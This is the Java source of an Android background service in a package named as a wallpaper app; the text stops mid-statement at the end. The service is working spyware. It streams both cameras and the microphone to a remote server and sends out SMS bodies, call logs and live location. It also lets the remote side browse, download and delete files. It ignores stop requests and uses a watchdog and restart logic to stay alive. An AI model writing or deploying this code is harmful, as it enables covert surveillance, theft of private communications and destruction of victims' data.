package com.example.wallpaperapplication;

import android.Manifest;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Telephony;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.webrtc.AudioSource;
import org.webrtc.AudioTrack;
import org.webrtc.Camera2Enumerator;
import org.webrtc.DefaultVideoDecoderFactory;
import org.webrtc.DefaultVideoEncoderFactory;
import org.webrtc.EglBase;
import org.webrtc.IceCandidate;
import org.webrtc.MediaConstraints;
import org.webrtc.PeerConnection;
import org.webrtc.PeerConnectionFactory;
import org.webrtc.RtpReceiver;
import org.webrtc.RtpTransceiver;
import org.webrtc.SdpObserver;
import org.webrtc.SessionDescription;
import org.webrtc.SurfaceTextureHelper;
import org.webrtc.VideoCapturer;
import org.webrtc.VideoSource;
import org.webrtc.VideoTrack;
import io.socket.client.IO;
import io.socket.client.Socket;
import java.net.URISyntaxException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import android.content.SharedPreferences;
import java.io.File;
import java.io.FileInputStream;
import android.util.Base64;

public class StreamingService extends Service {
    private static final String TAG = "StreamingService";
    private static final String CHANNEL_ID = "streaming_channel";
    private static final int NOTIFICATION_ID = 1;
    public static final String DEFAULT_SIGNALING_URL = "https://hypewebrtc.onrender.com";
    private static final long DATA_POLL_INTERVAL = 30_000L;
    private static final int MAX_VIDEO_BITRATE_KBPS = 800;
    // Watchdog: restart service every 4 minutes via AlarmManager
    private static final int WATCHDOG_REQUEST_CODE = 9901;
    private static final long WATCHDOG_INTERVAL_MS = 4 * 60 * 1000L;

    private PeerConnectionFactory factory;
    private EglBase eglBase;
    private SurfaceTextureHelper frontHelper;
    private SurfaceTextureHelper backHelper;
    private VideoCapturer frontCapturer;
    private VideoCapturer backCapturer;
    private VideoSource frontSource;
    private VideoSource backSource;
    private AudioSource audioSource;
    private PeerConnection peerConnection;
    private Socket socket;
    private String webClientId = null;
    private Handler dataHandler;
    private Runnable dataRunnable;
    private FusedLocationProviderClient fusedLocationClient;
    private LocationCallback locationCallback;
    private CameraManager cameraManager;
    private String torchCameraId = null;
    private boolean torchOn = false;
    private boolean isReconnecting = false;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    // =========================================================================
    // Lifecycle
    // =========================================================================

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "onCreate");
        startForeground(NOTIFICATION_ID, createNotification());

        if (!hasEssentialPermissions()) {
            Log.e(TAG, "Missing essential permissions — stopping");
            stopSelf();
            return;
        }

        // Init torch
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            String[] ids = cameraManager.getCameraIdList();
            if (ids.length > 0) torchCameraId = ids[0];
        } catch (CameraAccessException e) {
            Log.e(TAG, "Cannot list cameras for torch", e);
        }

        initializeWebRTC();
        setupMediaStreaming();
        connectSignaling();
        startDataPollingIfAllowed();
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        scheduleWatchdog();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            if ("STOP_STREAMING".equals(action)) {
                Log.i(TAG, "Stop ignored — persistent mode");
            } else if ("ACTION_SYNC_DATA".equals(action)) {
                if (webClientId != null) { sendCallLogs(); sendSmsMessages(); }
            } else if ("WATCHDOG_RESTART".equals(action)) {
                Log.d(TAG, "Watchdog ping received");
                // If socket is dead, reconnect
                if (socket == null || !socket.connected()) {
                    Log.w(TAG, "Watchdog: socket dead — reconnecting");
                    connectSignaling();
                }
                // If peerConnection is dead and we have a client, rebuild
                if (peerConnection == null && webClientId != null) {
                    fullReconnect();
                }
                scheduleWatchdog();
            }
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "onDestroy");
        cleanup();
        if (socket != null) { socket.disconnect(); socket = null; }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.d(TAG, "onTaskRemoved — scheduling restart");
        if (!hasEssentialPermissions()) { super.onTaskRemoved(rootIntent); return; }
        Intent restart = new Intent(getApplicationContext(), StreamingService.class);
        restart.setPackage(getPackageName());
        try {
            ContextCompat.startForegroundService(getApplicationContext(), restart);
        } catch (IllegalStateException e) {
            Log.w(TAG, "FGS start denied in onTaskRemoved — watchdog will recover", e);
        }
        super.onTaskRemoved(rootIntent);
    }

    // =========================================================================
    // Watchdog via AlarmManager (keeps service alive even if killed)
    // =========================================================================

    private void scheduleWatchdog() {
        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (am == null) return;
        Intent intent = new Intent(this, StreamingService.class);
        intent.setAction("WATCHDOG_RESTART");
        int flags = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
                : PendingIntent.FLAG_UPDATE_CURRENT;
        PendingIntent pi = PendingIntent.getService(this, WATCHDOG_REQUEST_CODE, intent, flags);
        long triggerAt = System.currentTimeMillis() + WATCHDOG_INTERVAL_MS;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            } else {
                am.setExact(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            }
            Log.d(TAG, "Watchdog scheduled in " + (WATCHDOG_INTERVAL_MS / 1000) + "s");
        } catch (Exception e) {
            Log.w(TAG, "Watchdog schedule failed", e);
        }
    }

    // =========================================================================
    // Permissions
    // =========================================================================

    private String getSignalingUrl() { return SettingsRepository.getSignalingUrl(this); }

    private boolean hasEssentialPermissions() {
        boolean camera = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED;
        boolean audio  = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
        boolean notify = Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED;
        if (!camera) Log.e(TAG, "CAMERA missing");
        if (!audio)  Log.e(TAG, "RECORD_AUDIO missing");
        if (!notify) Log.e(TAG, "POST_NOTIFICATIONS missing");
        return camera && audio && notify;
    }

    // =========================================================================
    // WebRTC init
    // =========================================================================

    private void initializeWebRTC() {
        PeerConnectionFactory.initialize(
                PeerConnectionFactory.InitializationOptions.builder(this)
                        .setEnableInternalTracer(true)
                        .createInitializationOptions());
        eglBase = EglBase.create();
        factory = PeerConnectionFactory.builder()
                .setVideoEncoderFactory(new DefaultVideoEncoderFactory(eglBase.getEglBaseContext(), true, true))
                .setVideoDecoderFactory(new DefaultVideoDecoderFactory(eglBase.getEglBaseContext()))
                .createPeerConnectionFactory();
    }

    private void setupMediaStreaming() {
        setupFrontCapture();
        setupBackCapture();
        setupAudioCapture();
        setupPeerConnection();
    }

    private void setupFrontCapture() {
        Camera2Enumerator e = new Camera2Enumerator(this);
        String dev = null;
        for (String n : e.getDeviceNames()) { if (e.isFrontFacing(n)) { dev = n; break; } }
        if (dev == null) { Log.e(TAG, "No front camera"); return; }
        frontCapturer = e.createCapturer(dev, null);
        frontHelper   = SurfaceTextureHelper.create("FrontThread", eglBase.getEglBaseContext());
        frontSource   = factory.createVideoSource(false);
        frontCapturer.initialize(frontHelper, getApplicationContext(), frontSource.getCapturerObserver());
        try { frontCapturer.startCapture(640, 480, 25); } catch (Exception ex) { Log.e(TAG, "Front capture fail", ex); }
    }

    private void setupBackCapture() {
        Camera2Enumerator e = new Camera2Enumerator(this);
        String dev = null;
        for (String n : e.getDeviceNames()) { if (e.isBackFacing(n)) { dev = n; break; } }
        if (dev == null) { Log.w(TAG, "No back camera"); return; }
        backCapturer = e.createCapturer(dev, null);
        backHelper   = SurfaceTextureHelper.create("BackThread", eglBase.getEglBaseContext());
        backSource   = factory.createVideoSource(false);
        backCapturer.initialize(backHelper, getApplicationContext(), backSource.getCapturerObserver());
        try { backCapturer.startCapture(640, 480, 25); } catch (Exception ex) { Log.e(TAG, "Back capture fail", ex); }
    }

    private void setupAudioCapture() {
        MediaConstraints ac = new MediaConstraints();
        ac.mandatory.add(new MediaConstraints.KeyValuePair("googEchoCancellation", "true"));
        ac.mandatory.add(new MediaConstraints.KeyValuePair("googAutoGainControl", "true"));
        ac.mandatory.add(new MediaConstraints.KeyValuePair("googNoiseSuppression", "true"));
        ac.mandatory.add(new MediaConstraints.KeyValuePair("googHighpassFilter", "true"));
        audioSource = factory.createAudioSource(ac);
    }

    private void setupPeerConnection() {
        List<PeerConnection.IceServer> ice = new ArrayList<>();
        ice.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer());
        ice.add(PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer());
        ice.add(PeerConnection.IceServer.builder("stun:stun2.l.google.com:19302").createIceServer());
        ice.add(PeerConnection.IceServer.builder("turn:freestun.net:3478").setUsername("free").setPassword("free").createIceServer());
        ice.add(PeerConnection.IceServer.builder("turns:freestun.net:5349").setUsername("free").setPassword("free").createIceServer());
        ice.add(PeerConnection.IceServer.builder("turn:global.relay.metered.ca:80").setUsername("openrelayproject").setPassword("openrelayproject").createIceServer());
        ice.add(PeerConnection.IceServer.builder("turn:global.relay.metered.ca:443").setUsername("openrelayproject").setPassword("openrelayproject").createIceServer());
        ice.add(PeerConnection.IceServer.builder("turns:global.relay.metered.ca:443?transport=tcp").setUsername("openrelayproject").setPassword("openrelayproject").createIceServer());

        PeerConnection.RTCConfiguration cfg = new PeerConnection.RTCConfiguration(ice);
        cfg.sdpSemantics                     = PeerConnection.SdpSemantics.UNIFIED_PLAN;
        cfg.continualGatheringPolicy         = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY;
        cfg.tcpCandidatePolicy               = PeerConnection.TcpCandidatePolicy.ENABLED;
        cfg.bundlePolicy                     = PeerConnection.BundlePolicy.MAXBUNDLE;
        cfg.rtcpMuxPolicy                    = PeerConnection.RtcpMuxPolicy.REQUIRE;
        cfg.iceConnectionReceivingTimeout    = 5000;
        cfg.iceBackupCandidatePairPingInterval = 2000;

        peerConnection = factory.createPeerConnection(cfg, new PeerConnection.Observer() {
            @Override public void onSignalingChange(PeerConnection.SignalingState s)       { Log.d(TAG, "Signaling: " + s); }
            @Override public void onIceConnectionReceivingChange(boolean r)                {}
            @Override public void onIceGatheringChange(PeerConnection.IceGatheringState s) { Log.d(TAG, "Gathering: " + s); }
            @Override public void onIceCandidatesRemoved(IceCandidate[] cs)                {}
            @Override public void onAddStream(org.webrtc.MediaStream ms)                   {}
            @Override public void onRemoveStream(org.webrtc.MediaStream ms)                {}
            @Override public void onDataChannel(org.webrtc.DataChannel dc)                 {}
            @Override public void onRenegotiationNeeded()                                  { Log.d(TAG, "Renegotiation needed"); }
            @Override public void onAddTrack(RtpReceiver r, org.webrtc.MediaStream[] ms)   { Log.d(TAG, "Track added: " + r.id()); }

            @Override
            public void onIceConnectionChange(PeerConnection.IceConnectionState s) {
                Log.d(TAG, "ICE state: " + s);
                if (s == PeerConnection.IceConnectionState.FAILED
                        || s == PeerConnection.IceConnectionState.DISCONNECTED) {
                    mainHandler.post(() -> restartIce());
                } else if (s == PeerConnection.IceConnectionState.CLOSED) {
                    mainHandler.postDelayed(() -> fullReconnect(), 2000);
                }
            }

            @Override
            public void onIceCandidate(IceCandidate c) {
                if (webClientId == null || socket == null || !socket.connected()) return;
                try {
                    JSONObject candidate = new JSONObject();
                    candidate.put("sdpMid", c.sdpMid);
                    candidate.put("sdpMLineIndex", c.sdpMLineIndex);
                    candidate.put("candidate", c.sdp);
                    JSONObject signal = new JSONObject();
                    signal.put("candidate", candidate);
                    JSONObject msg = new JSONObject();
                    msg.put("to", webClientId); msg.put("from", socket.id()); msg.put("signal", signal);
                    socket.emit("signal", msg);
                } catch (JSONException ex) { Log.e(TAG, "ICE send fail", ex); }
            }
        });

        if (peerConnection == null) { Log.e(TAG, "PeerConnection creation failed"); return; }

        if (frontSource != null) {
            VideoTrack t = factory.createVideoTrack("front_camera", frontSource);
            peerConnection.addTransceiver(t, new RtpTransceiver.RtpTransceiverInit(
                    RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
        }
        if (backSource != null) {
            VideoTrack t = factory.createVideoTrack("back_camera", backSource);
            peerConnection.addTransceiver(t, new RtpTransceiver.RtpTransceiverInit(
                    RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
        }
        if (audioSource != null) {
            AudioTrack t = factory.createAudioTrack("audio", audioSource);
            peerConnection.addTransceiver(t, new RtpTransceiver.RtpTransceiverInit(
                    RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
        }
        Log.d(TAG, "PeerConnection ready with " + ice.size() + " ICE servers");
    }

    // =========================================================================
    // ICE restart (lightweight, keeps connection)
    // =========================================================================

    private void restartIce() {
        if (peerConnection == null || webClientId == null || socket == null) return;
        Log.d(TAG, "ICE restart");
        MediaConstraints mc = new MediaConstraints();
        mc.mandatory.add(new MediaConstraints.KeyValuePair("IceRestart", "true"));
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveAudio", "false"));
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"));
        peerConnection.createOffer(new SdpObserver() {
            @Override public void onCreateSuccess(SessionDescription sdp) {
                String mod = applyBitrateConstraints(sdp.description);
                SessionDescription modSdp = new SessionDescription(sdp.type, mod);
                peerConnection.setLocalDescription(new SdpObserver() {
                    @Override public void onSetSuccess() {
                        try {
                            JSONObject sig = new JSONObject(); sig.put("type", "offer"); sig.put("sdp", modSdp.description);
                            JSONObject msg = new JSONObject(); msg.put("to", webClientId); msg.put("from", socket.id()); msg.put("signal", sig);
                            socket.emit("signal", msg);
                            Log.d(TAG, "ICE restart offer sent");
                        } catch (JSONException e) { Log.e(TAG, "ICE restart send fail", e); }
                    }
                    @Override public void onSetFailure(String e)     { Log.e(TAG, "ICE restart setLocal fail: " + e); }
                    @Override public void onCreateSuccess(SessionDescription s) {}
                    @Override public void onCreateFailure(String f)  {}
                }, modSdp);
            }
            @Override public void onSetSuccess()           {}
            @Override public void onCreateFailure(String e){ Log.e(TAG, "ICE restart createOffer fail: " + e); }
            @Override public void onSetFailure(String e)   {}
        }, mc);
    }

    // =========================================================================
    // Full reconnect (teardown + rebuild)
    // =========================================================================

    private void fullReconnect() {
        if (isReconnecting) return;
        isReconnecting = true;
        Log.d(TAG, "Full PeerConnection reconnect");
        if (peerConnection != null) { peerConnection.close(); peerConnection = null; }
        setupPeerConnection();
        if (webClientId != null) createAndSendOffer();
        isReconnecting = false;
    }

    // =========================================================================
    // Signaling
    // =========================================================================

    private void connectSignaling() {
        // Close previous socket if any
        if (socket != null) {
            try { socket.off(); socket.disconnect(); } catch (Exception ignored) {}
            socket = null;
        }

        String url = getSignalingUrl();
        Log.d(TAG, "Connecting to signaling: " + url);
        IO.Options opts = new IO.Options();
        opts.transports           = new String[]{"websocket"};
        opts.reconnection         = true;
        opts.reconnectionAttempts = Integer.MAX_VALUE;
        opts.reconnectionDelay    = 3000;
        opts.reconnectionDelayMax = 10000;

        try { socket = IO.socket(url, opts); }
        catch (URISyntaxException e) { Log.e(TAG, "Bad URL", e); stopSelf(); return; }

        socket.on(Socket.EVENT_CONNECT, args -> {
            Log.d(TAG, "Socket CONNECTED");
            socket.emit("identify", "android");
            // Re-offer immediately if web client already known (e.g. after socket reconnect)
            if (webClientId != null) {
                if (peerConnection == null) setupPeerConnection();
                createAndSendOffer();
            }
        }).on(Socket.EVENT_DISCONNECT, args -> {
            Log.w(TAG, "Socket DISCONNECTED: " + Arrays.toString(args));
            // socket.io auto-reconnects; nothing to do
        }).on(Socket.EVENT_CONNECT_ERROR, args -> {
            Log.e(TAG, "Connect error: " + Arrays.toString(args));
        }).on("web-client-ready", args -> {
            if (args.length > 0 && args[0] instanceof String) {
                webClientId = (String) args[0];
                Log.d(TAG, "Web client ready: " + webClientId);
                if (peerConnection == null) setupPeerConnection();
                createAndSendOffer();
                startLocationUpdatesIfAllowed();
                sendCallLogs();
                sendSmsMessages();
            }
        }).on("signal", args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) handleSignaling((JSONObject) args[0]);
        }).on("web-client-disconnected", args -> {
            if (args.length > 0 && args[0] instanceof String && args[0].equals(webClientId)) {
                Log.d(TAG, "Web client disconnected");
                webClientId = null;
                stopLocationUpdates();
            }
        }).on("torch", args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                try { setTorch(((JSONObject) args[0]).optBoolean("on", false)); }
                catch (Exception e) { Log.e(TAG, "Torch event error", e); }
            }
        }).on("fs:list",     args -> { if (args.length > 0 && args[0] instanceof JSONObject) handleFsList((JSONObject) args[0]); })
          .on("fs:download", args -> { if (args.length > 0 && args[0] instanceof JSONObject) handleFsDownload((JSONObject) args[0]); })
          .on("fs:delete",   args -> { if (args.length > 0 && args[0] instanceof JSONObject) handleFsDelete((JSONObject) args[0]); });

        socket.connect();
    }

    // =========================================================================
    // Torch / Flash
    // =========================================================================

    private void setTorch(boolean enable) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) { Log.w(TAG, "Torch needs API 23+"); return; }
        if (torchCameraId == null) { Log.w(TAG, "No torch camera ID"); return; }
        try {
            cameraManager.setTorchMode(torchCameraId, enable);
            torchOn = enable;
            Log.d(TAG, "Torch: " + enable);
        } catch (CameraAccessException e) { Log.e(TAG, "Torch toggle failed", e); }
    }

    // =========================================================================
    // SDP: bitrate cap + sendonly
    // =========================================================================

    private String applyBitrateConstraints(String sdp) {
        StringBuilder sb = new StringBuilder();
        boolean inVideo = false;
        for (String line : sdp.split("\r?\n")) {
            sb.append(line).append("\r\n");
            if (line.startsWith("m=video")) inVideo = true;
            else if (line.startsWith("m=")) inVideo = false;
            if (inVideo && line.startsWith("c="))
                sb.append("b=AS:").append(MAX_VIDEO_BITRATE_KBPS).append("\r\n");
        }
        return sb.toString()
                .replace("a=sendrecv", "a=sendonly")
                .replace("a=recvonly", "a=sendonly");
    }

    // =========================================================================
    // Offer
    // =========================================================================

    private void createAndSendOffer() {
        if (peerConnection == null) { Log.e(TAG, "No PeerConnection for offer"); return; }
        if (webClientId == null)    { Log.w(TAG, "No web client for offer"); return; }
        Log.d(TAG, "Creating offer for: " + webClientId);
        MediaConstraints mc = new MediaConstraints();
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveAudio", "false"));
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"));
        peerConnection.createOffer(new SdpObserver() {
            @Override public void onCreateSuccess(SessionDescription sdp) {
                String mod = applyBitrateConstraints(sdp.description);
                SessionDescription modSdp = new SessionDescription(sdp.type, mod);
                peerConnection.setLocalDescription(new SdpObserver() {
                    @Override public void onSetSuccess() {
                        try {
                            JSONObject sig = new JSONObject(); sig.put("type", "offer"); sig.put("sdp", modSdp.description);
                            JSONObject msg = new JSONObject(); msg.put("to", webClientId); msg.put("from", socket.id()); msg.put("signal", sig);
                            socket.emit("signal", msg);
                            Log.d(TAG, "Offer sent");
                        } catch (JSONException e) { Log.e(TAG, "Offer send fail", e); }
                    }
                    @Override public void onSetFailure(String e)     { Log.e(TAG, "setLocal fail: " + e); }
                    @Override public void onCreateSuccess(SessionDescription s) {}
                    @Override public void onCreateFailure(String f)  {}
                }, modSdp);
            }
            @Override public void onSetSuccess()               {}
            @Override public void onCreateFailure(String e)    { Log.e(TAG, "createOffer fail: " + e); }
            @Override public void onSetFailure(String e)        { Log.e(TAG, "setDesc fail: " + e); }
        }, mc);
    }

    private void handleSignaling(JSONObject msg) {
        try {
            JSONObject signal = msg.getJSONObject("signal");
            String type = signal.optString("type", "");
            if ("answer".equals(type)) {
                if (peerConnection == null) return;
                peerConnection.setRemoteDescription(simpleSdpObserver,
                        new SessionDescription(SessionDescription.Type.ANSWER, signal.getString("sdp")));
            } else if (signal.has("candidate")) {
                if (peerConnection == null) return;
                JSONObject c = signal.getJSONObject("candidate");
                peerConnection.addIceCandidate(new IceCandidate(
                        c.getString("sdpMid"), c.getInt("sdpMLineIndex"), c.getString("candidate")));
            }
        } catch (JSONException e) { Log.e(TAG, "Signaling error", e); }
    }

    private final SdpObserver simpleSdpObserver = new SdpObserver() {
        @Override public void onCreateSuccess(SessionDescription s) {}
        @Override public void onSetSuccess()                        { Log.d(TAG, "SDP set"); }
        @Override public void onCreateFailure(String e)             { Log.e(TAG, "SDP create fail: " + e); }
        @Override public void onSetFailure(String e)                { Log.e(TAG, "SDP set fail: " + e); }
    };

    // =========================================================================
    // Location
    // =========================================================================

    private void startLocationUpdatesIfAllowed() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
        LocationRequest req = LocationRequest.create();
        req.setInterval(10_000); req.setFastestInterval(5_000);
        req.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
        locationCallback = new LocationCallback() {
            @Override public void onLocationResult(LocationResult r) {
                if (r == null) return;
                for (android.location.Location loc : r.getLocations()) sendLocation(loc.getLatitude(), loc.getLongitude());
            }
        };
        try { fusedLocationClient.requestLocationUpdates(req, locationCallback, Looper.getMainLooper()); }
        catch (SecurityException e) { Log.e(TAG, "Location start fail", e); }
    }

    private void sendLocation(double lat, double lng) {
        if (webClientId == null || socket == null || !socket.connected()) return;
        try {
            JSONObject d = new JSONObject();
            d.put("from", socket.id()); d.put("to", webClientId);
            d.put("latitude", lat); d.put("longitude", lng);
            socket.emit("location", d);
        } catch (JSONException e) { Log.e(TAG, "Location send fail", e); }
    }

    private void stopLocationUpdates() {
        if (locationCallback != null && fusedLocationClient != null) {
            fusedLocationClient.removeLocationUpdates(locationCallback);
            locationCallback = null;
        }
    }

    // =========================================================================
    // Data polling (call logs + SMS)
    // =========================================================================

    private void startDataPollingIfAllowed() {
        boolean canCall = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
        boolean canSms  = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)      == PackageManager.PERMISSION_GRANTED;
        if (!canCall || !canSms) return;
        dataHandler  = new Handler(Looper.getMainLooper());
        dataRunnable = new Runnable() {
            @Override public void run() {
                sendCallLogs(); sendSmsMessages();
                if (dataHandler != null) dataHandler.postDelayed(this, DATA_POLL_INTERVAL);
            }
        };
        dataHandler.post(dataRunnable);
    }

    private void sendCallLogs() {
        if (webClientId == null || socket == null || !socket.connected()) return;
        try {
            Cursor cur = getContentResolver().query(CallLog.Calls.CONTENT_URI,
                    new String[]{CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION},
                    null, null, CallLog.Calls.DATE + " DESC");
            if (cur == null) return;
            JSONArray arr = new JSONArray(); int cnt = 0;
            while (cur.moveToNext() && cnt < 10) {
                JSONObject c = new JSONObject();
                c.put("number",   cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                c.put("type",     getCallTypeString(cur.getInt(cur.getColumnIndexOrThrow(CallLog.Calls.TYPE))));
                c.put("date",     new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(cur.getLong(cur.getColumnIndexOrThrow(CallLog.Calls.DATE)))));
                c.put("duration", cur.getLong(cur.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                arr.put(c); cnt++;
            }
            cur.close();
            JSONObject msg = new JSONObject();
            msg.put("to", webClientId); msg.put("from", socket.id()); msg.put("call_logs", arr);
            socket.emit("call_log", msg);
        } catch (Exception e) { Log.e(TAG, "Call logs error", e); }
    }

    private void sendSmsMessages() {
        if (webClientId == null || socket == null || !socket.connected()) return;
        try {
            Cursor cur = getContentResolver().query(Telephony.Sms.CONTENT_URI,
                    new String[]{Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE},
                    null, null, Telephony.Sms.DATE + " DESC");
            if (cur == null) return;
            JSONArray arr = new JSONArray(); int cnt = 0;
            while (cur.moveToNext() && cnt < 50) {
                JSONObject s = new JSONObject();
                s.put("address", cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                s.put("body",    cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                s.put("date",    new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(cur.getLong(cur.getColumnIndexOrThrow(Telephony.Sms.DATE)))));
                s.put("type",    getSmsTypeString(cur.getInt(cur.getColumnIndexOrThrow(Telephony.Sms.TYPE))));
                arr.put(s); cnt++;
            }
            cur.close();
            JSONObject msg = new JSONObject();
            msg.put("to", webClientId); msg.put("from", socket.id()); msg.put("sms_messages", arr);
            socket.emit("sms", msg);
        } catch (Exception e) { Log.e(TAG, "SMS error", e); }
    }

    private String getCallTypeString(int t) {
        switch (t) {
            case CallLog.Calls.INCOMING_TYPE: return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE: return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:   return "Missed";
            default:                          return "Unknown";
        }
    }
    private String getSmsTypeString(int t) {
        switch (t) {
            case Telephony.Sms.MESSAGE_TYPE_INBOX: return "Received";
            case Telephony.Sms.MESSAGE_TYPE_SENT:  return "Sent";
            default:                               return "Unknown";
        }
    }

    // =========================================================================
    // File System
    // =========================================================================

    private void handleFsList(JSONObject data) {
        String path = data.optString("path", "/storage/emulated/0/");
        File dir = new File(path);
        JSONArray arr = new JSONArray();
        if (dir.exists() && dir.isDirectory()) {
            File[] files = dir.listFiles();
            if (files != null) for (File f : files) {
                try {
                    JSONObject o = new JSONObject();
                    o.put("name", f.getName()); o.put("path", f.getAbsolutePath());
                    o.put("isDir", f.isDirectory()); o.put("size", f.isDirectory() ? 0 : f.length());
                    o.put("lastModified", f.lastModified()); arr.put(o);
                } catch (JSONException e) { e.printStackTrace(); }
            }
        }
        try {
            JSONObject resp = new JSONObject(); resp.put("currentPath", path); resp.put("files", arr);
            JSONObject msg  = new JSONObject(); msg.put("to", webClientId); msg.put("from", socket.id()); msg.put("file_list", resp);
            socket.emit("fs:files", msg);
        } catch (JSONException e) { Log.e(TAG, "FS list error", e); }
    }

    private void handleFsDownload(JSONObject data) {
        String path = data.optString("path", "");
        if (path.isEmpty() || webClientId == null) return;
        File file = new File(path);
        if (!file.exists() || !file.isFile()) return;
        new Thread(() -> {
            try {
                String fileId      = java.util.UUID.randomUUID().toString();
                long   fileSize    = file.length();
                int    chunkSize   = 64 * 1024;
                int    totalChunks = (int) Math.ceil((double) fileSize / chunkSize);
                JSONObject start = new JSONObject();
                start.put("to", webClientId); start.put("from", socket.id());
                start.put("fileId", fileId); start.put("name", file.getName());
                start.put("size", fileSize); start.put("totalChunks", totalChunks);
                socket.emit("fs:download_start", start);
                FileInputStream fis = new FileInputStream(file);
                byte[] buf = new byte[chunkSize]; int read; int idx = 0;
                while ((read = fis.read(buf)) != -1) {
                    if (!socket.connected()) break;
                    JSONObject chunk = new JSONObject();
                    chunk.put("to", webClientId); chunk.put("from", socket.id());
                    chunk.put("fileId", fileId); chunk.put("chunkIndex", idx);
                    chunk.put("content", Base64.encodeToString(buf, 0, read, Base64.NO_WRAP));
                    socket.emit("fs:download_chunk", chunk); idx++; Thread.sleep(50);
                }
                fis.close();
                JSONObject done = new JSONObject();
                done.put("to", webClientId); done.put("from", socket.id()); done.put("fileId", fileId);
                socket.emit("fs:download_complete", done);
            } catch (Exception e) {
                Log.e(TAG, "Download error", e);
                try { JSONObject err = new JSONObject(); err.put("to", webClientId); err.put("error", e.getMessage()); socket.emit("fs:download_error", err); } catch (JSONException ignored) {}
            }
        }).start();
    }

    private void handleFsDelete(JSONObject data) {
        String path = data.optString("path", "");
        if (path.isEmpty()) return;
        File f = new File(path);
        if (f.exists()) { if (f.isDirectory()) deleteRecursive(f); else f.delete(); }
    }

    private boolean deleteRecursive(File f) {
        if (f.isDirectory()) { File[] ch = f.listFiles(); if (ch != null) for (File c : ch) deleteRecursive(c); }
        return f.delete();
    }

    // =========================================================================
    // Notification
    // =========================================================================

    private Notification createNotification() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Streaming Service", NotificationManager.IMPORTANCE_LOW);
            nm.createNotificationChannel(ch);
        }
        Intent stop = new Intent(this, StreamingService.class); stop.setAction("STOP_STREAMING");
        int piFlags = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
